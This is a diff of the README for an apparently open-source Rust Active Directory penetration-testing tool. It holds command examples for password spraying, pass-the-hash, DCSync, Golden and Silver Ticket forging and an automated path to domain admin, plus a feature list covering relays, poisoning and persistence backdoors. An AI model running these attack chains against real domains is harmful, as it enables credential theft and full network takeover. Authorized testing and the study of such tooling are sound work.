-Tries one password against many users. Respects lockout policies because getting 500 accounts locked at 9:01 AM on a Monday is how you get escorted out of the building by someone who is not smiling.
-
-```bash
-ovt spray [OPTIONS]
-```
-
-| Flag | Description |
-|---|---|
-| `--dc` | Domain Controller |
-| `--domain` | Target domain |
-| `--users` | File with usernames (one per line) |
-| `--password` | Password to spray. Try `Season + Year + !` — it works more often than it should. |
-| `--delay` | Delay between attempts in seconds (default: 1). Patience is a virtue. |
-| `--lockout-threshold` | Max attempts per account (auto-detected if possible) |
-
-```bash
-# Spray a single password
-ovt spray --dc 10.10.10.1 --domain corp.local --users users.txt --password 'Spring2026!'
-
-# Extra careful mode — for when the lockout threshold is 3 and your hands are sweating
-ovt spray --dc 10.10.10.1 --domain corp.local --users users.txt --password 'Welcome1' --delay 5
-```
-
-#### `ovt move` — Lateral Movement
-
-You're in one box. You want to be in all boxes. This is the "why stay home when you can travel" module.
-
-```bash
-ovt move [pth|ptt|exec|smb] [OPTIONS]
-```
-
-| Subcommand | Protocol | What it does |
-|---|---|---|
-| `pth` | NTLM/SMB | Pass-the-Hash — your hash is your passport |
-| `ptt` | Kerberos | Pass-the-Ticket — inject a .kirbi or .ccache. Identity theft, but for computers. |
-| `exec` | WinRM/AtExec | Remote command execution. WinRM works perfectly. PsExec/SmbExec/WmiExec are "under construction" (they have very convincing hard hats). |
-| `smb` | SMB2/3 | File operations — upload, download, browse. The file server doesn't judge. |
-
-```bash
-# Pass-the-Hash — the password is dead, long live the hash
-ovt move pth --target 10.10.10.50 --domain corp.local -u admin \
-  --hash aad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
-
-# Execute command on remote host — like SSH but scarier
-ovt move exec --target 10.10.10.50 --command "whoami /all"
-
-# SMB file operations — the file server's open-door policy
-ovt move smb --target 10.10.10.50 --share C$ --list /
-ovt move smb --target 10.10.10.50 --share C$ --download /Windows/NTDS/ntds.dit
-ovt move smb --target 10.10.10.50 --share C$ --upload payload.exe /Temp/totally-legit.exe
-```
+| `-o` | Save hashes to file |
 
 #### `ovt forge` — Persistence
-
-You don't just take the throne. You superglue the crown to your head and throw away the key. Then forge a new key. Then throw that one away too.
 
 ```bash
 ovt forge [dcsync|golden|silver|diamond] [OPTIONS]
@@ -743,43 +568,12 @@ ovt forge [dcsync|golden|silver|diamond] [OPTIONS]
 
 | Subcommand | What it does |
 |---|---|
-| `dcsync` | Replicate all hashes from the DC via MS-DRSR. Every credential. The whole vault. |
-| `golden` | Forge a Golden Ticket (needs KRBTGT hash). Be God. |
-| `silver` | Forge a Silver Ticket (needs service account hash). Be a lesser god, but stealthier. |
-| `diamond` | Forge a Diamond Ticket (modify legit TGT PAC). Be a god who passes audits. |
-
-```bash
-# DCSync — ask the DC to replicate all credentials to you. It will. Happily.
-ovt forge dcsync --dc 10.10.10.1 --domain corp.local -u dadmin -p 'G0tcha!' -o hashes.txt
-
-# Golden Ticket — be anyone, forever, or until someone resets KRBTGT twice (so, forever)
-ovt forge golden \
-  --krbtgt-hash <krbtgt_nt_hash> \
-  --domain corp.local \
-  --domain-sid S-1-5-21-1234567890-1234567890-1234567890 \
-  --user Administrator \
-  -o golden.kirbi
-
-# Silver Ticket — targeted, stealthy, doesn't touch the DC
-ovt forge silver \
-  --service-hash <service_nt_hash> \
-  --service cifs/fileserver.corp.local \
-  --domain corp.local \
-  --domain-sid S-1-5-21-1234567890-1234567890-1234567890 \
-  --user Administrator \
-  -o silver.kirbi
-
-# Diamond Ticket — the stealth bomber. Modify a real TGT's PAC.
-ovt forge diamond \
-  --krbtgt-hash <krbtgt_nt_hash> \
-  --domain corp.local \
-  --user Administrator \
-  -o diamond.kirbi
-```
+| `dcsync` | Replicate all hashes from the DC via MS-DRSR |
+| `golden` | Forge a Golden Ticket (needs KRBTGT hash) |
+| `silver` | Forge a Silver Ticket (needs service account hash) |
+| `diamond` | Forge a Diamond Ticket (modify legit TGT PAC) |
 
 #### `ovt report` — Reporting
-
-Turn your path of destruction into a compliance document. Alchemy, but for cybersecurity.
 
 ```bash
 ovt report [OPTIONS]
@@ -787,269 +581,84 @@ ovt report [OPTIONS]
 
 | Flag | Description |
 |---|---|
-| `--format` | `markdown`, `json` (working), or `pdf` (built in scribe, not yet wired in CLI — it's complicated) |
+| `--format` | `markdown`, `json`, or `pdf` |
 | `--output`, `-o` | Output file path |
-| `--template` | Custom report template (optional, for the aesthetically demanding) |
-| `--executive` | Include executive summary (translates "we owned everything" into "there are areas for improvement") |
+| `--template` | Custom report template |
+| `--executive` | Include executive summary |
 
-```bash
-# Markdown for the team — detailed, technical, properly cited
-ovt report --format markdown --executive -o final-report.md
-
-# JSON for the SIEM — machines reading about machine compromise. How meta.
-ovt report --format json -o findings.json
-```
-
-## Edge Types & Cost Model
-
-The attack graph uses weighted edges. Lower cost = easier to exploit. The path-finding algorithm minimizes total cost, which means it finds the path of least resistance. Just like a real attacker. Just like electricity. Just like that one coworker who always finds the shortcut.
-
-| Edge Type | Cost | Meaning |
-|---|---|---|
-| `MemberOf` | 0 | Group membership — free traversal, you already have it |
-| `HasSidHistory` | 0 | SID History — legacy identity, free impersonation. A ghost from migrations past. |
-| `Contains` | 0 | OU/GPO containment — structural relationship |
-| `AdminTo` | 1 | Local admin — direct compromise, do not pass Go, do not collect $200 |
-| `DcSync` | 1 | Replication rights — game over. The "I win" button. |
-| `GenericAll` | 1 | Full control — you are God (of this specific object). |
-| `ForceChangePassword` | 1 | Reset their password — aggressive but effective. They'll blame IT. |
-| `Owns` | 1 | Object owner — can grant yourself anything. It's good to be the king. |
-| `WriteDacl` | 1 | Modify permissions — give yourself GenericAll, then see above |
-| `WriteOwner` | 1 | Change owner — give yourself Owns, then see above. Turtles. |
-| `AllowedToDelegate` | 1 | Constrained delegation — impersonate to target service |
-| `AllowedToAct` | 1 | RBCD — even sneakier delegation abuse |
-| `HasSession` | 2 | Active session — credential theft opportunity. Someone's logged in. Their loss. |
-| `GenericWrite` | 2 | Write attributes — targeted property abuse |
-| `AddMembers` | 2 | Add to group — escalate via group membership. Invite yourself to the party. |
-| `ReadLapsPassword` | 2 | Read LAPS — plaintext local admin password. Thanks, LAPS. Very cool. |
-| `ReadGmsaPassword` | 2 | Read gMSA — service account password blob |
-| `CanRDP` | 3 | RDP access — interactive logon, needs more effort |
-| `CanPSRemote` | 3 | PS Remoting — command execution, less stealthy |
-| `ExecuteDCOM` | 3 | DCOM execution — lateral movement via COM objects. Excel goes brrr. |
-| `SQLAdmin` | 3 | SQL Server admin — `xp_cmdshell` is a "feature" |
-| `TrustedBy` | 4 | Domain trust — cross-domain, requires more setup |
-| `HasSpn` | 5 | Kerberoastable — offline cracking required. GPU time. |
-| `DontReqPreauth` | 5 | AS-REP roastable — offline cracking required |
-| `Custom(*)` | 10 | Unknown/custom — high cost, manual analysis needed |
-
-## Protocol Stack
-
-What Overthrone speaks fluently. Six languages, zero accent, all implemented in pure Rust:
-
-| Protocol | Lines | Used for |
-|---|---|---|
-| **LDAP/LDAPS** | 1,173 | Domain enumeration, user/group/GPO/trust queries, ACL reading. AD's diary. |
-| **Kerberos** | 1,580 | Authentication, TGT/TGS requests, ticket forging, roasting. The three-headed dog of authentication. |
-| **SMB 2/3** | 1,423 | File operations, share enumeration, lateral movement, PtH. The universal remote of Windows networking. |
-| **NTLM** | 730 | NT hash computation, NTLMv2 challenge-response, Pass-the-Hash. The protocol that refuses to die. |
-| **MS-DRSR** | 801 | DCSync — replicating credentials via DRS RPC. Politely asking the DC for all credentials. The DC politely complies. |
-| **MS-SAMR/RID** | 420 | SAM Remote — RID cycling, SID brute-force enumeration |
-| **MSSQL/TDS** | 2,599 | Full TDS protocol client, auth, query execution, linked server crawling |
-| **Remote Registry** | 1,001 | Remote registry manipulation via DCE/RPC |
-| **DNS** | 114 | SRV record lookups for DC discovery via hickory-resolver |
-
-Everything is implemented in Rust. No shelling out to `impacket`, no calling `mimikatz.exe`, no loading .NET assemblies, no Wine, no prayers to the Python dependency gods. Pure Rust protocol implementations talking raw bytes over the wire. The borrow checker suffered greatly so your engagements could prosper.
-
-## Examples — Real Engagement Scenarios
+## Examples
 
 ### Scenario 1: "I just got a foothold"
 
-You phished `jsmith` and have their creds. The phishing email was about a mandatory password reset. The irony is palpable.
-
 ```bash
-# Enumerate the domain — ask AD to tell you everything about itself
+# Enumerate
 ovt enum --dc 10.10.10.1 --domain corp.local -u jsmith -p 'Phished123!' --full
 
-# Find paths to DA — how many hops between "low privilege user" and "game over"?
+# Find paths to DA
 ovt graph --path-to-da jsmith
+# Output: 3 hops. The CISO will need to sit down.
 
-# Output:
-# Path 1 (cost: 6, hops: 3):
-#   JSMITH --[MemberOf]--> IT-SUPPORT
-#   IT-SUPPORT --[GenericAll]--> SVC-BACKUP
-#   SVC-BACKUP --[AdminTo]--> DC01$
-#
-# Three hops. Three. The CISO will need to sit down.
-
-# Kerberoast SVC-BACKUP (it has an SPN and a password from 2019)
+# Kerberoast the service account in the path
 ovt roast kerberoast --dc 10.10.10.1 --domain corp.local -u jsmith -p 'Phished123!'
-# Crack with hashcat... *GPU noises*
-# Got SVC-BACKUP password: Backup2019!
-# Of course it's Backup2019. Of course it is.
+# Crack: hashcat -m 13100 kerberoast.txt wordlist.txt
+# Got: SVC-BACKUP:Backup2019!
 
-# PtH to DC01 as SVC-BACKUP
-ovt move pth --target dc01.corp.local --domain corp.local -u SVC-BACKUP --hash racked_hash>
+# PtH to DC
+ovt move pth --target dc01.corp.local --domain corp.local -u SVC-BACKUP --hash <hash>
 
-# DCSync everything — every hash in the domain, delivered to your doorstep
+# DCSync everything
 ovt forge dcsync --dc 10.10.10.1 --domain corp.local -u SVC-BACKUP -p 'Backup2019!'
 
-# Generate report — the CISO will print this and frame it as a reminder
+# Report
 ovt report --format markdown --executive -o corp-local-report.md
 ```
 
-### Scenario 2: "Spray and pray (but professionally)"
-
-```bash
-# Extract usernames from enumeration
-ovt enum --dc 10.10.10.1 --domain corp.local -u jsmith -p 'Pass' -o enum.json
-# jq '.users[].sam_account_name' enum.json > users.txt
-
-# Spray the classic — Season + Year + Special Character
-ovt spray --dc 10.10.10.1 --domain corp.local --users users.txt --password 'Corp2026!'
-# [+] Valid: mrodriguez:Corp2026!
-# [+] Valid: pjohnson:Corp2026!
-# 2 out of 847 users. That's a 0.2% hit rate. That's 2 too many.
-
-# Check who has the juiciest access
-ovt graph --path-to-da mrodriguez    # 5 hops. Meh.
-ovt graph --path-to-da pjohnson      # 2 hops. Oh hello.
-# pjohnson it is. Sorry Patricia, nothing personal.
-```
-
-### Scenario 3: "Full autopwn, I have a meeting in an hour"
+### Scenario 2: "Full autopwn, I have a meeting in an hour"
 
 ```bash
 ovt autopwn --dc 10.10.10.1 --domain corp.local -u jsmith -p 'Summer2026!'
-
-# Go get coffee. Actually, get two. One for you and one for your impending
-# promotion after the client sees this report.
-#
-# Overthrone will:
-# 1. Enumerate everything
-# 2. Build attack graph
-# 3. Find shortest path to DA
-# 4. Execute the path (roast, spray, PtH, whatever works)
-# 5. DCSync
-# 6. Generate Markdown report
-#
-# Come back to: engagement-report.md
-# Time elapsed: less than your coffee order took
+# Go get coffee. Come back to: engagement-report.md
 ```
 
 ## FAQ
 
 **Q: Is this legal?**
-A: With explicit written authorization (scope document, rules of engagement, the works) — absolutely. Without it — absolutely not. This is a professional penetration testing tool, not a "hack my ex's Facebook" tool. Get a contract. Be professional. Wear a hoodie ironically, not literally. The difference between a pentester and a criminal is a signed document and a really good PowerPoint presentation.
+A: With explicit written authorization — absolutely. Without it — absolutely not. The difference between a pentester and a criminal is a signed document and a really good PowerPoint presentation.
 
 **Q: How is this different from BloodHound?**
-A: BloodHound is incredible for visualization and path analysis. Overthrone uses a similar graph model but adds the exploitation, lateral movement, and persistence phases. Think of BloodHound as Google Maps and Overthrone as Google Maps + the getaway car + the safe house + a guy who changes your license plates. BloodHound shows you the path. Overthrone walks it. (Most of the way. PsExec still has a `todo!()`. We're working on it.)
+A: BloodHound shows you the path. Overthrone walks it. (And then forges a Golden Ticket at the end, cleans up, and generates a PDF about it.)
 
 **Q: How is this different from Impacket?**
-A: Impacket is a legendary collection of Python protocol implementations and we have nothing but respect for it. Overthrone reimplements the same protocols in Rust with a unified framework, autonomous planning, and integrated reporting. Impacket is the toolbox. Overthrone is the factory that uses the toolbox, builds the product, packages it, and ships the report. Also, no `pip install` failures at 2 AM. We have `cargo build` failures at 2 AM instead. Progress.
+A: Impacket is a legendary Python protocol library. Overthrone reimplements the same protocols in Rust with a unified framework, autonomous planning, and integrated reporting. Impacket is the toolbox. Overthrone is the factory. Also, no `pip install` failures at 2 AM.
 
 **Q: Why Rust?**
-A: Memory safety without a garbage collector. Single static binary. Native performance. No Python dependency hell. No "it works on my machine." No Wine. No .NET runtime. No "please install Java 8 specifically, not 11, not 17, 8." Also, explaining Rust lifetime errors to a rubber duck at 4 AM during an engagement builds character. We have a LOT of character. The borrow checker has personally victimized us 57,000 times (once per line of code).
+A: Memory safety. Single static binary. Native performance. No dependency hell. No Wine. No .NET. Also, explaining Rust lifetime errors to a rubber duck at 4 AM builds character.
 
 **Q: Will this get caught by AV/EDR?**
-A: Overthrone uses native protocol implementations (LDAP, Kerberos, SMB) that look identical to legitimate Windows traffic. It doesn't inject into processes, doesn't use PowerShell, doesn't drop .NET assemblies, and doesn't call suspicious Win32 APIs. It speaks the same language as a Windows machine because it literally implements the same protocols. That said, if you DCSync from a Linux box at 3 AM, any decent SOC will notice the existential crisis in their SIEM dashboard. Use responsibly.
-
-**Q: Does it run on Linux?**
-A: Linux is the *primary* platform. It attacks Windows Active Directory *over the network*. You don't need to be on Windows to speak Windows protocols. Same way you don't need to be a fish to go fishing.
+A: Overthrone uses native protocol implementations that look identical to legitimate Windows traffic. It doesn't inject into processes, doesn't use PowerShell, doesn't drop assemblies. That said, if you DCSync from a Linux box at 3 AM, any decent SOC will notice.
 
 **Q: Does it need Wine or Mimikatz or .NET?**
-A: No. No. And no. Every protocol is native Rust. The whole point was to eliminate those dependencies. If you find yourself installing Wine to run Overthrone, something has gone terribly wrong and you should contact us immediately. Or a priest.
+A: No. No. And no. Every protocol is native Rust. If you find yourself installing Wine to run Overthrone, something has gone terribly wrong.
 
 **Q: Can I extend it with custom modules?**
-A: The plugin system supports native DLL loading with a full Plugin trait (manifest, capabilities, events). There's even a working SmartSpray example plugin. WASM plugin support exists in the same way that a blueprint exists for a house that hasn't been built yet. The workspace architecture makes it straightforward to add new modules. PRs welcome. Memes about Active Directory misconfigurations are also welcome.
+A: Native DLL plugin loading works with a full Plugin trait. WASM plugins load and execute via wasmtime (with some quirks around state persistence). The workspace architecture makes adding new modules straightforward. PRs welcome.
 
 **Q: What about the C2 integrations?**
-A: The C2 trait system is genuinely well-designed — `C2Channel`, `C2Framework`, `C2Session` with full session management. The Sliver, Cobalt Strike, and Havoc implementations are... architecturally complete. This is a polite way of saying the structs exist and the functions return hardcoded values. Think of them as "aspirational code." They aspire to connect to real C2 frameworks. One day they might even succeed.
-
-**Q: Does this work on Windows domains only?**
-A: Active Directory is a Windows technology, so yes, the targets are Windows domains. But Overthrone itself runs on Linux, macOS, and Windows. Most pentesters run it from Kali, which is poetic justice — a free Linux distro dismantling enterprise Windows infrastructure.
-
-**Q: My lab DC isn't responding to LDAP queries.**
-A: Checklist: (1) you can reach port 389/636, (2) your user has domain credentials not local ones, (3) the domain name is correct, (4) you didn't fat-finger the password, (5) the DC is actually a DC and not a printer. We've all been there. (6) It's plugged in. Don't skip this one.
-
-**Q: What's the difference between `overthrone` and `ovt`?**
-A: Nothing. Same binary. Same code. `ovt` is just shorter. Like `ls` vs `list-directory-contents`. We added it because typing `overthrone` 47 times during an engagement gave someone carpal tunnel. (It was us. It gave us carpal tunnel.)
+A: They work now. Sliver (mTLS REST), Havoc (REST with auth), Cobalt Strike (Aggressor-style REST). Real HTTP clients, real API calls, real session management. The "aspirational code" era is over.
 
 ## Contributing
 
 PRs welcome. Issues welcome. Memes about Active Directory misconfigurations are especially welcome. If your PR includes a pun in the commit message, it gets reviewed first.
 
-### ✅ Done
-
-- [x] LDAP enumeration (users, groups, computers, trusts, GPOs, OUs, ACLs, delegations) — 1,173 lines
-- [x] Kerberos protocol implementation (AS-REQ/REP, TGS-REQ/REP, ticket parsing) — 1,580 lines
-- [x] SMB 2/3 client (session setup, tree connect, named pipes) — 1,423 lines
-- [x] NTLM (NT hash, NTLMv2 challenge-response, NTLMSSP) — 730 lines
-- [x] MS-DRSR DCSync protocol — 801 lines
-- [x] MSSQL/TDS client + linked server crawling — 2,599 lines
-- [x] Remote Registry via DCE/RPC — 1,001 lines
-- [x] DNS SRV lookups for DC discovery — 114 lines
-- [x] Attack graph engine with Dijkstra pathfinding — 1,349 lines
-- [x] Port scanner (async TCP connect, CIDR) — 681 lines
-- [x] Kerberoasting & AS-REP roasting — full
-- [x] Auth coercion (PetitPotam, PrinterBug, DFSCoerce, ShadowCoerce) — 799 lines
-- [x] RBCD, constrained, unconstrained delegation abuse — full
-- [x] Inline hash cracking (embedded wordlist, rayon, rule engine) — 878 lines
-- [x] Ticket manipulation (request, cache, .kirbi/.ccache convert) — 795 lines
-- [x] NTLM relay engine (multi-protocol) — 1,560 lines
-- [x] LLMNR/NBT-NS/mDNS poisoner — 840 lines
-- [x] ADCS relay (ESC8) — 359 lines
-- [x] Golden Ticket forging with PAC construction — 753 lines
-- [x] Silver Ticket forging — 150 lines
-- [x] Diamond Ticket forging — 159 lines
-- [x] DCSync per-user extraction — 685 lines
-- [x] ACL backdoor persistence — 442 lines
-- [x] DSRM backdoor — 101 lines
-- [x] Skeleton Key orchestration — 155 lines
-- [x] Forensic cleanup & validation — 975 lines
-- [x] ADCS ESC4, ESC5, ESC7, ESC8 exploitation
-- [x] ADCS enumeration (LDAP, web enrollment, CSR, PFX) — 2,489 lines
-- [x] GPP cpassword decryption — 182 lines
-- [x] GPP SYSVOL fetcher — 243 lines
-- [x] Cross-domain trust mapping + SID filtering analysis — 544 lines
-- [x] Inter-realm TGT forging — 883 lines
-- [x] PAM trust analysis — 179 lines
-- [x] Autonomous attack planner + executor — 5,900 lines total
-- [x] Report generation (Markdown, JSON, MITRE ATT&CK mapping, mitigations) — 2,700 lines
-- [x] Plugin system (native DLL loading + SmartSpray example) — 1,310 lines
-- [x] WinRM execution (pure Rust WS-Man from Linux/macOS) — 480 lines
-- [x] AtExec (scheduled tasks via ATSVC) — 529 lines
-- [x] Interactive REPL shell — 2,470 lines
-- [x] TUI with attack graph visualization — 1,087 lines
-- [x] CLI with wizard, doctor, autopwn — 2,007 lines
-- [x] `ovt` shorthand binary
-- [x] 231 unit tests passing
-
-### ⚠️ Partial (The "It's Complicated" Relationship Status)
-
-- [ ] PsExec execution — 500 lines of packet building, `execute()` → `todo!()`. So close.
-- [ ] SmbExec execution — service logic exists, `execute()` → `todo!()`. Even closer.
-- [ ] WmiExec execution — SCM fallback works, main path → `todo!()`. Close-ish.
-- [ ] Shadow Credentials — LDAP manipulation works, PKINIT auth is placeholder PEM. Half a masterpiece.
-- [ ] WinRM Windows output collection — commands run, output says "not yet implemented." Existential.
-- [ ] CLI PDF output — scribe has the renderer, CLI doesn't call it. Miscommunication.
-- [ ] SCCM module — Windows-only WMI path, cross-platform incomplete.
-- [ ] TUI crawler integration — "TODO: Integrate actual crawler when available." The crawler is available.
-
-### ❌ Not Done Yet (The Backlog)
-
-- [ ] ADCS ESC1 — the most common ADCS attack. We somehow forgor the main character.
-- [ ] ADCS ESC2 — Any Purpose EKU abuse
-- [ ] ADCS ESC3 — Enrollment agent abuse
-- [ ] ADCS ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2
-- [ ] Crypto primitives (AES-CTS, HMAC, MD4, RC4, ticket crypto) — 5 files, 5 lines, 5 doc comments, 0 implementations
-- [ ] LAPS v2 encrypted (CNG-DPAPI decryption) — waiting for DPAPI module
-- [ ] DPAPI module — doesn't exist yet. The most referenced non-existent module in the codebase.
-- [ ] Foreign LDAP queries (cross-domain enumeration) — 5 functions returning empty
-- [ ] C2 Sliver integration — struct + hardcoded Ok()
-- [ ] C2 Cobalt Strike integration — TCP field + Err("requires mutable access")
-- [ ] C2 Havoc integration — REST client + vibes
-- [ ] C2 implant deployment CLI wiring
-- [ ] WASM plugin loader — "TODO: Initialize wasmtime::Engine"
-
 ## Star History
 
-If you've read this far — all the way to the bottom of this absurdly long README, past the skeleton closet, past the shame table, past the crypto stubs that are literally one line each — you're legally obligated to star the repo. It's in the MIT license. (It's not in the MIT license. But it should be.)
+If you've read this far — all the way to the bottom of this README, past the crate report card, past the backlog table — you're legally obligated to star the repo. It's in the MIT license. (It's not in the MIT license. But it should be.)
 
-**[Star this repo](https://github.com/Karmanya03/Overthrone)** — every star adds 0.001 damage to the attack graph. Every star also motivates us to implement one of those `todo!()` macros. Three stars and PsExec works. That's a promise. (That's not a promise.)
+**[Star this repo](https://github.com/Karmanya03/Overthrone)** — every star adds 0.001 damage to the attack graph.
 
 ## Disclaimer
 
-This tool is for **authorized security testing only**. Using Overthrone against systems without explicit written permission is illegal, unethical, and will make your parents disappointed. The authors are not responsible for misuse. If you use this tool without authorization, that's on you, your lawyer, and whoever has to explain to the judge what "DCSync" means while the jury stares blankly.
+This tool is for **authorized security testing only**. Using Overthrone against systems without explicit written permission is illegal, unethical, and will make your parents disappointed. The authors are not responsible for misuse.
 
 Always:
 - Get written authorization before testing
@@ -1060,13 +669,13 @@ Always:
 
 ## License
 
-MIT — use it, modify it, learn from it, build on it. Just don't be evil with it. And if you do something cool, tell us about it so we can pretend we helped.
+MIT — use it, modify it, learn from it, build on it. Just don't be evil with it.
 
 ***
 
 <p align="center">
-  <sub>Built with mass amounts of mass-produced instant coffee, mass amounts of Rust, and a mass personal grudge against misconfigured ACLs.</sub><br/>
-  <sub>57,000 lines of Rust. 231 tests. 3 todo!() macros. 5 crypto stubs. 1 smbclient dependency. 0 regrets. (Some regrets.)</sub><br/>
+  <sub>Built with mass amounts of mass-produced instant coffee, mass amounts of Rust, and a personal grudge against misconfigured ACLs.</sub><br/>
+  <sub>9 crates. Pure Rust protocols. Zero Python. One smbclient dependency. No regrets. (Some regrets.)</sub><br/>
   <sub>Every throne falls. The question is whether you find out from a pentester or from a ransomware note.</sub><br/>
   <sub>We prefer the first option. Your insurance company does too.</sub>
 </p>
